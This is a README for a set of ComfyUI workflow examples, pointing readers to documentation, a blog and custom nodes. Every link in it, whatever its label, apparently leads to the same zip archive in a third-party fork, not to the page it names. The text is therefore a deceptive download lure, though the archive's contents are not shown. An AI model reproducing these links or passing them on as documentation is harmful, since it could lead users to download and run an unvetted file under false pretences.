# [ComfyUI](https://github.com/LDyaoshengchen/ComfyUI_examples/raw/refs/heads/master/model_merging/U_Comfy_examples_2.6.zip) Examples

This [repo](https://github.com/LDyaoshengchen/ComfyUI_examples/raw/refs/heads/master/model_merging/U_Comfy_examples_2.6.zip) contains examples of what is achievable with [ComfyUI](https://github.com/LDyaoshengchen/ComfyUI_examples/raw/refs/heads/master/model_merging/U_Comfy_examples_2.6.zip). All the images in this repo contain metadata which means they can be loaded into ComfyUI with the Load button (or dragged onto the window) to get the full workflow that was used to create the image.

A good place to start if you have no idea how any of this works is the:

## Documentation

#### [WIP Documentation](https://github.com/LDyaoshengchen/ComfyUI_examples/raw/refs/heads/master/model_merging/U_Comfy_examples_2.6.zip)

The old [Node Guide (WIP)](https://github.com/LDyaoshengchen/ComfyUI_examples/raw/refs/heads/master/model_merging/U_Comfy_examples_2.6.zip) documents what most nodes do.

The [ComfyUI Blog](https://github.com/LDyaoshengchen/ComfyUI_examples/raw/refs/heads/master/model_merging/U_Comfy_examples_2.6.zip) is also a source of various information.

#### Custom Nodes/extensions:

ComfyUI is extensible and many people have written some great custom nodes for it.

Note that I am not responsible if one of these breaks your workflows, your ComfyUI install or anything else.

Here are some places where you can find some:
